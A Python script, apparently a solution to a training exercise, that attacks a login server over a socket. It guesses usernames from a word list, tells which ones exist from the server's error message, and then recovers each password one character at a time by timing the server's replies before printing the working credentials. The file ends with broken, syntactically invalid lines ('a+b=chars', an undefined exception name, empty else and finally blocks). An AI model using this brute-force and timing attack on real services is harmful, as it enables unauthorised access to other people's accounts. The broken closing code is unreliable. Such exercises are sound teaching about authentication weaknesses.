import sys
import socket
import json
import random
from string import ascii_letters, digits
import time
import datetime

ourpwd = " "
userfound = False
script, ip_address, port = sys.argv
full_address = (ip_address, int(port))

with open("logins.txt", "r") as login:
    allusernames = login.read().splitlines()
chars = ascii_letters + digits


def logon(user_id="", password=" "):
    user_id = user_id
    pwd = password
    cred = {"login": user_id, "password": pwd}
    return json.dumps(cred)


with socket.socket() as client_socket:
    client_socket.connect(full_address)
    for user in allusernames:

        client_socket.send(logon(user).encode())
        response = client_socket.recv(1024).decode()
        response = json.loads(response)
        if response["result"] == "Wrong password!":
            # print(json.dumps(response, indent=4))
            userfound = True
            while userfound:
                if ourpwd == " ":
                    r_password = ''.join(random.choice(chars) for i in range(random.randint(1, 1)))
                    msgsend = datetime.datetime.now()
                    client_socket.send(logon(user, r_password).encode())
                if ourpwd != " ":
                    r_password = ourpwd + ''.join(random.choice(chars) for i in range(random.randint(1, 1)))
                    msgsend = datetime.datetime.now()
                    client_socket.send(logon(user, r_password).encode())
                response = client_socket.recv(1024).decode()
                msgrecv = datetime.datetime.now()
                msgdelta = (msgrecv - msgsend).total_seconds()
                # print("delta", msgdelta)
                response = json.loads(response)
                if msgdelta > 0.1:
                    # time.sleep(2)
                    ourpwd = ""
                    ourpwd = ourpwd + r_password
                # if response["result"] == "Exception happened during login":
                #     print("delta", msgdelta)
                #     time.sleep(2)
                #     ourpwd = ""
                #     ourpwd = ourpwd + r_password
                    # print(json.dumps(response, indent=4))
                if response["result"] == "Connection success!":
                    # print(f"Connection success! with user id: {user}, Password : {r_password}")
                    op = {"login": user, "password": r_password}
                    print(json.dumps(op))
                    exit()
try:
    a+b=chars
except arierror:
else:
finally:
